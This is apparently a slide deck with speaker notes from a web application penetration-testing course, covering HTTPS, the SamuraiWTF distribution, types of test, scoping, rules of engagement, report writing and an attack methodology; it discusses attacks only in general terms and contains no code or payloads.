---

# Encrypting HTTP in Transit

- SSL/TLS are two common options for encrypting HTTP
	- TLS is the successor to SSL
	- TLS adds more options for encryption and hashing
		- Including using two different hashing methods to lower the chance of hash collision
	- Usually just referred to as “SSL” regardless of whether it is TLS or SSL
		- “TLS” only used when more verbal precision is needed
- Secures the transport of requests and responses as they move across the network
- Relies on the trust placed with Certifying Authorities (CA)

Note:
HTTP has been an amazing success– particularly from the attacker's perspective.  Anyone who has run tcpdump or Wireshark can attest to the ease with which an attacker can inspect content sent across the network.  

To address the issue, we rely on the Transport-Layer Security (TLS) framework. The predecessor to TLS is the Secure Sockets Layer (SSL). Informally, people often use "SSL" to refer to both SSL and TLS, so throughout this class we will use the terms interchangeably. SSL versions 2 and earlier are considered far less secure than SSL v3 and TLS. 

SSL/TLS operates beneath the OSI model's Application layer, and can be used to encapsulate any application-layer protocol. This allows the same technology to be used to secure SMTP and IMAP (for example) as is used for HTTP.  LDAPS/SMTPS/IMAPS/HTTPS have been so successful that full VPN products such as OpenVPN  have been built on the power of SSL, allowing for much simpler setup than IPSEC alternatives.  

SSL/TLS relies on Public Key Infrastructure (PKI) for encryption and trust.  

---

# Certificate Trusts

<!-- Consider converting to .svg image? -->
![](assets/day1/076/certificate-trusts-diagram.png)

Note:
The web server owner generates a key and submits it to a certificate authority.  The CA performs some form of authentication and verification that the server is who it says it is.  This verification can be as simple as sending an e-mail to the domain or as complex as the process followed for the extended validation (EV) certificates.

When the web browser requests an HTTPS page from the web server, it receives the server's public key.  Since this is signed by the CA and the CA is trusted, the browser trusts that this server is who it identifies itself as.

---

# HTTPS: Attacker Perspective

- HTTPS prevents us from listening in or manipulating requests and responses as they pass by on the network
- But control either side (browser or server) and we can
	- Decrypt variables using key stolen from server
	- Alter variables at browser before they are sent across SSL connection
- HTTPS also hides our attacks from network-based IDS sensors, usually
	- Unless sensors are configured with web servers' certificates and perform on-the-fly decryption
		- This is unusual, because of its performance implications

Note:
HTTPS is used to create an encrypted connection between two computer systems.  This protection  keeps the data hidden from anyone who may be "sniffing" the network traffic.  

Each system involved in the communication can decrypt the data.  This can include proxy servers that forward and receive traffic for the connection, as well as the end systems. On either end, an attacker can easily access the data using any number of debugging tools and techniques such as DLL-injection (so-injection on POSIX)‏.

Web application attacks which occur over HTTPS-encrypted sessions are hidden from standard network devices and intrusion detection systems, because they are encrypted. 

This allows attackers to launch exploits with low probability of detection. Many IDS vendors are including in their products the capability to decrypt HTTPS traffic, which requires them to have the private keys of the protected servers. 

Other web entities architect their sites using HTTPS Accelerators which allow the HTTPS to terminate on a network device prior to the data reaching the web server.  

Not only does this gain performance but also allows IDS to see traffic between the HTTPS Accelerator and web server.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- ***Exercise: Analyzing HTTPS***
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
Scenario:  In this exercise, you will become acquainted with how data in an HTTPS encrypted request / response connection appears, and how that data can be decrypted within Wireshark if the proper HTTPS certificate is available.

Objectives: You will begin by monitoring HTTPS-encrypted data transferred to a web browser from the HTTPS server running in the provided virtual machine.  You will then go through the steps to install an HTTPS certificate in Wireshark that will allow you to decrypt and view data on the fly.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- ***SamuraiWTF***
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
In this next section, we will explore SamuraiWTF and its use within a penetration test and this class.

---

# SamuraiWTF

![](assets/day1/080/samuraiwtf-logo.png)

- Samurai Web Testing Framework is a live DVD
	- Bootable environment with a focus on web penetration testing
	- Similar to Backtrack, but focused on web app manipulation tools
- Created by Kevin Johnson of Secure Ideas   
and Justin Searle of UtiliSec
- It is freely available at:
	- http://www.samurai-wtf.org
	- Released in 2008 and continues to be actively updated
- SamuraiWTF is designed to be used as a pen testing environment and a place to try out new tools

Note:
The Samurai Web Testing Framework is an open source project released by Kevin Johnson of Secure Ideas and Justin Searle of UtiliSec.  It is a liveDVD environment that comes pre-installed to focus on web penetration testing.  It was released in 2008 and is actively being developed.  Kevin and Justin based it off of the Ubuntu Linux distribution.

This DVD is useful to penetration testers as it includes the tools we use every day as well as target applications.  This allows the tester to use tools without worrying about installing them and to have an environment to test and practice within.  In this class we will use SamuraiWTF as both a client during exercises and during the capture the flag on day 6.

---

# SamuraiWTF Desktop

- Samurai is a graphical desktop environment
- Runs within VM or bootable DVD
	- Or, you could install it as a complete system on a hard drive
- Many tools are pre-installed
	- All of the Linux tools discussed in this class
	- It does not include the Windows tools from the class
- Also includes a pre-configured wiki to store results and collaborate with others during a pen test project

Note:
The SamuraiWTF liveDVD is a graphical desktop.  Many of the tools are available right from the Samurai menu, others are accessible from a terminal.  Most have been installed in /usr/bin/samurai.  SamuraiWTF also includes SVN update capabilities to grab newer versions of the tools directly from developer sites.
 
SamuraiWTF comes with all of the tools we have been discussing in class.  Things such as Grendel-Scan and w3af are pre-installed and configured.  SamuraiWTF also ships with various interception proxies, (Burp, Paros, WebScarab) and stand-alone test tools, (nmap, webshag, sqlmap).

One of the most powerful features is the pre-configured wiki.  SamuraiWTF ships with a MoinMoin wiki that has been set up specifically to be used for web pen test tracking.  The developers of SamuraiWTF are also working on add-ons for the wiki that will provide features, such as automated host lookup or IPs and site mapping, that will make the tracking even easier.

+++

<!-- Add inline image instead of featuring as separate slide -->
![](assets/day1/081/samuraiwtf-desktop-screenshot.png)

---

# SamuraiWTF within the Class

- We have included a copy of SamuraiWTF on the class DVD
	- It is set up within a VM for ease of use in class
- This VM is the client machine for the exercises
	- It is also useful for day 6, the Capture the Flag
- All of the exercises, except when noted, use this as the client
	- All actions will be performed in this VM

Note:
On the class DVD is a VM that is configured to run the SamuraiWTF live environment.  This environment is used as the client within all of the exercises, unless noted within the exercise.  This is similar to how you would use SamuraiWTF within a real penetration test.

For the class, you will need to extract this VM from the zip file on the DVD.  Please make sure that when you first launch the VM select the right choice on if it was moved or copied.  As is shown in the README, select **I moved it**.  This retains the network settings within the VM.  This is the same for the target VM also.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- ***Penetration Testing Types and Methods***
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
The next few sections are going to discuss what we mean by a penetration test.  We will also be discussing the pieces that make up a test and discuss how an internal team is handled differently than an external test team.

We will start with the types of penetration tests that exist.

---

# Black Box<br />Penetration Testing

<!-- Consider converting to .svg image? -->
![](assets/day1/084/black-box.png)

- Little or no information provided to the testers in advance
	- Perhaps just the name of the target enterprise, an IP address range, or possibly a URL
	- The target is a black box that the tester must explore to understand
- Typically not done in web application testing
	- Except in the movies
	- We advise against such an approach
- Hardest to accomplish because most enterprises have multiple applications
	- Requires close coordination between testers and target system personnel to make sure testers remain in scope

Note:
A black box test is not done very often but seems to be the one that everybody thinks of when penetration testing is mentioned.  While it is possible to perform a web application test with just the URL to begin, we wouldn't recommend it! 

In a black-box penetration test, the testers are given little or no information about the target environment in advance. Black box testing is seen more often during network tests that include any web applications found.

---

# White Box<br />Penetration Testing

<!-- Consider converting to .svg image? -->
![](assets/day1/085/white-box.png)

- Completely open test
	- Testers are provided with information in advance, potentially including:
		- Target URL(s)
		- Application functionality summary
		- Application map
		- Test accounts
	- As test progresses, target system personnel answer questions for the testers
- Often performed by an internal team
	- Increasingly third-party testers are engaging in this type of test
- Integral part of the development process
- Source code is sometimes available to the tester

Note:
White box testing is the most cooperative test.  It is usually done by an internal team but more often outside firms are being asked to perform this type of testing.  The testing team is usually part of the QA team and as such becomes part of the software development life-cycle within the company.  They usually have access to the source code and will review it and any bug reports to find vulnerabilities.  External team brought on for this type of test need to make sure that they quickly understand the development processes used and integrate themselves rapidly.

---

# Grey Box<br />Penetration Testing

<!-- Consider converting to .svg image? -->
![](assets/day1/086/grey-box.png)

- Testers are provided some limited information at the outset of a test
	- URLs
	- User Accounts
- As the test progresses, information gathering is critical for success
- Most tests performed today fall into this category
- This is the model explored in class since it is   
the most common form of test 

Note:
The grey box test is the most common test done by external companies.  It requires the testing firm to do more work up front to gather the needed information.  Communication between the testing team and the application owners during the test is also critical.  Typically internal teams do not perform this type of test since they are part of the development process.

---

# Testing Methods:<br />Manual vs. Automated Testing

- There are two general methods for testing web applications
	- Manual testing using scripts and tools
	- Using automated testing tools
- We are often asked, “Which works better?”
	- Let's explore the pros and cons of each approach in more detail

Note:
In the next few slides we are going to discuss the differences between manually testing an application and running automated tools.  Then we will talk about which is better. This is a very common question, both from penetration testers and others.  

Each of the methods has their strengths, but they also have their weaknesses.  As penetration testers, we need to understand these differences and work around or with them during our tests.

---

# Manual Web App<br />Penetration Testing

- Human tester processes each page of the target application
- Although we call this “manual” testing, scripts and interactive tools are used
	- Tools are used to help formulate and manipulate requests and gather and analyze responses
- Time consuming, because a human tester controls each request and analyzes each response
- Thoroughness of such testing depends on tester's time, attention, and skill set
- Able to discover logic or business flaws

Note:
Manual attacks are one of the first ways that someone who wants to really understand an attack will use.  While we call it manual, simple scripts and tools can be used.  This method is relatively slow compared to automated testing, but can be as thorough as the tester chooses, because he or she controls the entire test.

---

# Automated Web App<br />Penetration Testing

- Automated tools scan a target website looking for signs of vulnerabilities
- Many automated scanners available, both commercial and open source
	- HP WebInspect - commercial
	- Cenzic Hailstorm - commercial
	- IBM AppScan - commercial
	- ZAP – free
	- Burp Suite – free/commercial
- Rapidly scans site but can still take a long time
	- Generally requires less time than manual testing
- Tester has less control of thoroughness
	- But, resulting tests tend to be more standardized and consistent
- Such an approach is more prone to false positives
- Also, this approach typically provides less detail about business implications of discovered flaws
	- More of a surface view of vulnerabilities, rather than in-depth penetration

Note:
Automated attacks use suites of tools that work together.  Some examples of these are WebInspect by HP and the Burp suite from portswigger.  These tools will rapidly scan a site and return the vulnerabilities it finds.  Keep in mind that rapidly can still take hours on larger sites, it just means faster than manually.  The problem is that the attacker has less control of what the attacks do and these tools are prone to false positives.

---

# Hybrid Web App<br />Penetration Testing

- Use each approach as the test progresses, mixing manual and automated techniques
- Scanners provide a starting point
- Manual verification and exploitation follows up
- As new components of the application are discovered or “unlocked” manually, the tester may run automated scans of them
	- The process is iterative, building on itself
- Scripting as the test dictates
- This course is based on a hybrid approach, which is used by most testers today

Note:
So which is better?  I find that as I test applications that both of these methods are combined to give me the best results from both.  I can use an automated scanner to give me a baseline and starting point.  And while that is running I can manually be reviewing the site for problems.

As you approach each site, you will need to balance the tools and methods you use.  As we have discussed, use the scanners as a starting point and then follow-up by validating their findings and using the findings to expand your foothold within the application.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- ***Web App Pen Test Components***
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
Next we are going to discuss the four pieces or sections of a web application pen-test.  They are preparation, testing, reporting and presentation.  All of them except presentation are mandatory if the penetration test can be considered successful.  It doesn't matter how cool your hack was, or how stylish your victory dance, if the report doesn't enable the application owner to fix the issues.

---

# Web App Pen Test Preparation

- Preparation is the first step …
	- … and it never stops
		- You are preparing right now
	- Includes developing your skills and planning a test
	- Practice, Practice, Practice
		- Everyday should involve some practice
			- Try new techniques, analyze new tools, look for new ways of exploiting flaws
		- Practice as a team
		- Build a lab with multiple target web servers
		- Use web applications installed specifically for testing and practice
			- Open source applications are perfect

Note:
Preparation never ends.  Think of any professional sports team.  They play one or two times a week in a real game, but they practice every day.  As penetration testers, you need to do the same thing.  We are also going to discuss some of the things that need to happen at a management level before the team can swing into action.

Every day you should be practicing your skills and techniques.  I will often set up a test system and install a few different open source applications to test my way through them.  One this enables me to practice with real systems that I will probably encounter during a regular engagement.  Two, I can report any problems I find back to the project so they can be fixed.  You should also practice as a team since everyone has a different style and by working together, you can learn how to build upon each other’s strengths.

---

# Managing a Web App<br />Penetration Test

- Managing penetration tests should be started BEFORE the hands-on testing begins
	- This step is often overlooked or skimped on
- Involves the testing team as well as target system personnel
	- And any vendors or infrastructure providers (Think cloud)
- Developers can also be brought into this process
	- Encourage their taking part to help improve security awareness

Note:
This next subsection is going to discuss the management of the test.  This is done in the preparation step since without an understanding of this, the test can't even start.  We will discuss making sure that everyone understands the test, the need for permission and the various pieces of information needed before beginning the test.

Keep in mind that we need to include both testing team personnel and the target organization's staff.  If this is a test that targets a third-party vendor in part or whole, make sure they are involved.  One group that should be brought in and isn't many times are the developers.  By including them in a penetration test we can accomplish two different actions.  First we encourage them to understand security better and they are prepared to share information if needed during the testing.

---

# Establishing the Test Scope

- The purpose of the test should be known
	- What are the biggest concerns associated with the target application(s)?  
	- For example, is the application owner worried about authentication issues?  Personally Identifiable Information (PII) breach?
	- Such information will impact the focus of the test but should not blind the tester from issues within the application
- The type of test should be agreed upon
	- Grey box or crystal box
	- Ensure everyone involved knows what is needed
- Scope of the test
	- Which applications or servers are involved?
		- For example, is the ecommerce portion of the application in-scope?
	- Are there any systems, URLs, or application functions that should be specifically avoided?

Note:
Before a test can begin, you must understand and agree on a type of test and its scope.  I have been involved with tests, especially internal ones, where the two sides had different ideas of scope.  If the application owner thinks you will be testing each and every application you find, and you have scoped two weeks to test the single sign-on functionality, someone is going to be real unhappy.  Either the application owner because not everything was done, or you because you ended up doing a lot more work.

It is also important to understand the goals of the person or group requesting the test.  They may want you to test for every single type of vulnerability and hole within the entire application suite, or they may only want to know if their administration section is secure.  By understanding what the requestor is expecting, you can focus your efforts to accomplish their goals.  Of course, if their goal is for you to say "everything is perfect" and you realize that the application has no authentication or input filtering whatsoever, you probably aren't going to be able to meet their goals. ;)

---

# Gathering Information Required<br />for the Test

- Information required before starting the hands-on testing:
	- Applications that are included in scope
	- Multiple user IDs and the passwords
		- These IDs should have different access
	- Technology restrictions
		-  Various examples such as client types, servers not to touch or ports to stay away from
	- Emergency contact information
		- From both the testing team and target system personnel

Note:
One of the things I see being the most difficult for testers is not having enough information to perform a test.  It is quite common for people to give a URL to a test team and then expect them to accomplish miracles!  

One of the first pieces needed is which applications are in scope.  For example, if you are testing an application behind a single sign on (SSO) system, does the application owner want the SSO tested or just the application behind it.  You will also need to get user ids to perform any testing of authenticated applications.  Typically I get at least two ids for each authorization level and I also test the registration of ids.  The reason you need two different ids for each level is to test horizontal attacks as well as vertical.  We will get into this more as the class progresses.  The restrictions refer to any technology restrictions the application places on the user.  For example, if the application only gets used by people with IE and the application owner can control that, it affects the test.

The last piece of information required is the emergency contacts.  You need to have communication paths into the target organization in case something goes wrong.  And they need to know how to reach you.  Even with the best testers and efforts, systems crash.  Be ready for it!

---

# Rules of Engagement

- Before testing can begin, testers and target system personnel must agree on some important Rules of Engagement:
	- Identifying tester traffic and data
	- Agreeing upon a testing time frame
	- Establishing a communications plan
- Much of this can be found from the scope we discussed before

Note:
The testing section will be covered in depth farther in the course, but we want to make sure to cover a few key points regarding Rules of Engagement to follow throughout the test process.  One, make sure the target knows where your attacks are coming from.  The worst thing to have happen is to have a real attacker targeting the application at the same time as your test, and the target assumes it's you and ignores it.  Another part of that is to identify your timeframes.  I have worked with companies that gave us free reign as to when we would test, others have requested that we only test after hours or during business hours for various reasons.

The last thing is to communicate.  Make sure that your communication paths are known and verified.  You don't want to crash the target's main web application and then realize that you don't know who to call and tell.  Or worse, when you call the contact you were given, they have no idea who you are and why you are calling.

---

# Identifying Tester Traffic and Data in the Application

- Target system personnel should be able to identify the testers' traffic and test data
	- This makes for far safer testing, and helps establish trust between testers and target system personnel
- Source identifiers should be agreed upon and provided to target system personnel
	- Tester systems' IP addresses
	- E-mail addresses that will be provided as input to the any e-mail forms used in the application
	- Other identifiers of testers' data
		- Example bogus credit card numbers or social security numbers
		- Other PII such as government ID numbers
		- Tester accounts
		- These items are often overlooked, but are vital

Note:
During the test, various identifiers will be used.  The attack traffic will be source from specific IP addresses or address ranges. The attackers will be sourcing e-mails and receiving e-mails from specific e-mail addresses.  They will also typically be using test accounts and information, such as credit card numbers, etc.  These pieces of information need to be given to the target.  This will enable them to determine if something is coming from the test or other attackers.

---

# Testing Time Windows

- Agree upon various time windows for testing activities in advance
	- How long will the test run?
	- Set testing windows
		- Business hours?
		- 12AM through 7AM?  Which time zone?
	- Time for analysis, reporting, and follow up 
- Also ensure that upfront deliverables are scheduled
	- Information required for the test, provided by target system personnel to testers
	- Support contact information
	- Final report – always write one to record what you did
	- Final presentation, if applicable

Note:
Before beginning the test, the client and the testers will need to work out various time frames.  These would include the length of time for the actual test, the windows in which the test can be performed and how long until the client will get the report. You should also arrange for time frames on various deliverables, such as data points needed for the test and response times from the client if the testers need information or assistance.

---

# Communications Planning

- Establish communication methods and contacts
	- Various communication contacts
		- Technical Contacts for target system personnel and testers
		- Management Contacts
	- Acceptable methods could include
		- E-mail
		- Phone
		- Instant Message
	- Protections should always be used, because sensitive information regarding application vulnerabilities may be discussed
		- PGP/GnuPG for e-mail or file being transferred
		- IM should use encryption
			- Off-the-Record (OTR) is an option

Note:
The communication paths also need to be worked out and coordinated.  This includes the paths communication needs to follow, the methods allowed and the protections within those methods.

The paths would include information such as, who would be contacted in case of technical problems.  An example would be if the site crashes due to the test.  You would also want to work out who handles the management of the test.  This enables the tester to have a point of contact when information is needed or if approval needs to happen.

The client and the testers will also need to coordinate which methods are allowed.  For example would e-mail suffice or does the client want a daily conference call with all involved.  

The final part of communication is the protections involved.  Does the client support PGP for e-mail or will the tester need to use some other form of encryption.  If instant messaging is going to be used will both parties use the Off-the-Record IM encryption or explore another solution.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- ***Reporting and Presenting Findings***
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
This next section is about the most important part of the test, the report.  While this is usually the portion groaned about by the testers, it is the piece that most people remember the test with.

---

# Reporting

- The final penetration test report is the most lasting portion of the test
	- As such, it is probably the most important
	- If our goal as penetration testers is to help target organizations improve security, the report is typically our most effective vehicle for doing so
- But most people hate writing it
	- Some people enjoy report writing, but they are in the minority
- Don't ignore this section because you don't enjoy it
	- It contains information to help you differentiate yourself, building on technical excellence with solid reporting
- Let's make it easier to create quality reports by covering the various sections in depth
	- Your report outline may vary, but the one we'll cover here is commonly used in this industry

Note:
Reporting is probably the most disliked portion of doing any type of testing.  We all love finding the next great hack or figuring out a way to bypass the trickiest of filters.  But few people like to write the report telling the application owner what happened.  But we need to keep in mind that this is probably the most important piece of the test.  This is because it is the part that actually lasts.  Most companies will take the report and use it as the guidelines on what to fix and how to move forward in securing their applications.  Quite often it will guide further developments efforts.

---

# Report Pieces

- A penetration testing report format that works well includes the following components:
	1. Executive summary
	2. Introduction
	3. Methodology
	4. Findings
	5. Conclusions
- All of the information gathered during the test becomes part of this reporting process
	- You may even include appendices with important notes, permission memos, and other items gathered or created during the test

Note:
There are five pieces to a report, the executive summary, introductions, methodology, findings and conclusions.   The entire testing process fed a collection of information.  This collection is the basis of the report.

We will explore each of these in the next few slides.

---

# (1) Executive Summary

- This section contains a high-level overview of our test and findings
- We need to target the biggest impact because the audience for this section is typically higher-level personnel
- Keep it short – Maximum 1.5 pages, but try to fit on a single page
- Contains
	- Findings
		- Critical findings are a must
		- Determine the root cause of findings and outline it here
		- In a web app pen test, these root causes often involve required changes to the web app development process
	- Recommendations
		- Reasonable and accomplishable goals
		- Overarching solutions if possible
		- Recommended timeframes – short-term fixes versus long-term changes

Note:
The executive summary is typically the hardest part for us to write.  Because of this we usually leave it for last.  Of course this helps since we need to have all of the rest of the report to determine what needs to be part of this.  It should be high level and short.  We usually don't go beyond a page or a page and a half.

The summary should target the things that can have the biggest impact.  Remember that this may be the only piece of the report that management reads, so make sure that any recommendations given will make the biggest or most important changes.

We need to make sure that we include a description of any findings and why they need to be fixed.  Then give a recommendation on ways to remediate the issue.  If possible, give more than one.  For example, talk about whitelisting input to ensure that input attacks are blocked, but also outline how blacklisting works.  While we can explain why one is better than the other, we need to realize that they may have restrictions that we are not aware of that would prevent the implementation of a whitelist.

---

# (2) Introduction

- Should outline the parts of the test
	- Explain the scope
		- Include any restrictions or special requests
	- Define the objective of the test
		- For example, if the application owner was only interested in the security of the authentication system, say so
	- List the team with contact information
		- List both testing personnel and the points of contact within the target organization
	- Typically, this section is 1 to 2 pages in length

Note:
The introduction is a quick portion of the report where you will outline the scope of the test.  You should also list any specific objectives.  For example, if the target was to access the back end administration portion of the site through the Internet, make sure that is clear.  Another part of the objectives portion is to outline any restrictions that you had.  An example would be if the company did not want you to test the authentication system for whatever reason.  This needs to be outlined to ensure that people understand what was tested and what was not.  You should also outline the team involved.  This includes the people doing the test and the people involved at the company requesting the test.  This enables internal follow up if any questions come up later.

---

# (3) Methodology

- Describe the methodology used during the test
	- Step-by-step, including the tools used at each step
	- Customize for the specific test and its findings – don't just use boilerplate
	- Your goal should be enough depth so that a competent penetration tester could verify and repeat your work …
		- … and a competent security pro who isn't a pen tester can at least understand your process
	- This section often runs 3 to 10 pages in length, depending on the depth of the test

Note:
Finally, the report should include some discussion of the methodology followed to perform the test.  As we will talk later, this ensures that your test can be verified and repeated.  Provide enough depth so that a competent penetration tester could repeat your results, and so that a competent security professional who is not a penetration tester can understand your overall process flow.

---

# (4) Findings

- The section contains the meat of the report
- Each finding is listed, categorized according to its risk
	- High/Medium/Low risk, as well as Notes
	- You may also want to include an indication of the likelihood that a given flaw will be exploited
	- Customize risk categories if target organization personnel use different terms
- Sometimes the findings need to be divided by application
	- When testing multiple applications with different audiences of developers and security personnel
- Recommendations are part of the findings
	- You may have multiple methods for dealing with a given finding
	- List each one of them, and identify which one is most beneficial for the target organization and why

Note:
The findings are really the meat of the report.  They are what the entire test was for.  The findings need to be categorized.  We typically use a High/Medium/Low/Notes system where we determine the risk level that each finding falls into and then explain what the finding means and why it falls into the specific risk level.  Each finding should include the recommendations.  The Notes risk level is for any problem found that does not relate directly to the web application.  For example, if the application allows us to read the /etc/shadow file and we are able to crack the root password because it is toor, this would go into a Notes finding.  The reason is that while that password is ridiculously weak, it is not a vulnerability within the application.  Of course the fact we could read the /etc/shadow file in the first place WOULD be a High finding.

---

# (5) Conclusions

- Conclusions are the final piece
- Very short section similar to the executive summary
- Reiterates the executive summary … 
	- But from a perspective of answering the technicians who will fix the issues
- Any appendixes are added after the conclusion, potentially including:
	- Permission memo(s)
	- Lists of users harvested
	- Records retrieved from the database
	- Detailed tool output

Note:
The conclusions are the final piece of the report.  It is where the tester can reiterate some of the points of the executive summary as well as any findings that they would like to draw more attention too.  It is usually a very short section of the report but may contain any appendixes, such as a listing of tools used or any bulk listings of files.

---

# Presentation

- This is an optional part of most penetration tests
	- But some organizations require it
- Excellent way to work with developers to improve security
	- Information exchange from tester to developers, and vice versa
- Audience should be chosen by target personnel
- May contain various types of staff:
	- Developers
	- Administrators
	- Management
	- Testing staff
- Consider holding multiple presentations focused on different types of staff

Note:
The presentation portion of a test is optional.  We like to recommend that people have this but some companies choose to skip it.  The presentation is basically a slide deck that outlines what was tested, what was found and recommendations on how to repair the issues.  We like to work with the target company to ensure that any message they want to get to developers, administrators or others is included in this presentation.  While we usually don't have a lot of control over who comes to this presentation, we try to recommend that a wide range of staff is included.  If time permits, we will try to separate developers and admins or technicians and management.  This is because those are separate audiences that require a different approach.

One important point in building the presentation is to redact any sensitive information.  For example, don't include URLs to pages that are vulnerable to SQL injection.  If you do, someone will try it out and cause problems.  We try to give an overview of the finding and how it works in a generic sense.  Then we work with the client to ensure that anyone who needs to know exactly how the exploit happens understands it.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- ***Attack Methodology***
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
In the next section, we will start to understand how the attacker works. We will build a four-step web penetration methodology process to use over the next few days.

---

# Web App Pen Test Methodology

- Our methodology has four steps
- Based on years of testing by many different web testers

<!-- Consider converting to .svg image
  -- or HTML table? -->
![](assets/day1/110/iterative-pentest-methodology-illustrated.png)
  
- This is an iterative methodology
	- Each step is based on the results from the previous steps
- The process is also cyclical
	- Each exploitation starts you again from a new perspective
	- By cycling through the steps, more issues can be found

Note:
Attack methodology:
- Reconnaissance: We research the target.
- Mapping: We understand what makes up the application and its surroundings.
- Discovery: We look for the vulnerabilities.
- Exploitation: We launch the attacks!

The attack process is cyclical.  Once you exploit a vulnerability, you can further the exploitation by starting the process again from that point.  For example, if I am successful in launching a SQL injection attack that allows me to execute commands on a server, I will start looking around to see what else I can uncover.  The knowledge I gained in this exploit helps me further the next attack.  This is important since we aren't a typical attacker– instead of just trying to penetrate the system in one way, we want to find as many of the problems as possible, so that we can fix them.

---

# Reconnaissance

- Successful attackers focus here!
- This step is commonly skipped as not important
- But it determines our attack focus
- Good use of the recon phase can expose items such as:
	- Architecture diagrams
	- Information for password reset attacks
- Skipping Reconnaissance forces the tester to work harder to exploit any issues
	- This wastes time in an already restricted time frame 

Note:
Reconnaissance is the first step in this four-step process.  It is often skipped, to the attacker's detriment.

Reconnaissance provides the foundation for a successful, efficient attack.  Sadly, many attackers skip this step, thinking it is a waste of time, and blindly start launching attacks.  This can be successful, but it is inefficient and can tip off the target. By focusing our time on finding out as much as possible before we start launching attacks, we can better focus our efforts and lower the risk of detection.

Reconnaissance is when the attacker starts to identify the target. We also use external resources such as Google and Monster.com to collect information about the target without accessing the target directly.

---

# Mapping

- Mapping involves understanding how the application and its underlying infrastructure work
- First steps involve port scanning, version checking, and operating system fingerprinting
- Then, we determine the various pieces of the application
	- For example, a common storefront contains:
		- Catalog pages
		- Information about the company
		- Shopping cart management pages
		- Checkout and delivery system
		- User management for returning visitors
- Testers should also examine the relationships between the parts of the application
	- What is the logic flow as users move through the application?
	- Start thinking about how this logic flow can be circumvented if the developers made bad assumptions

Note:
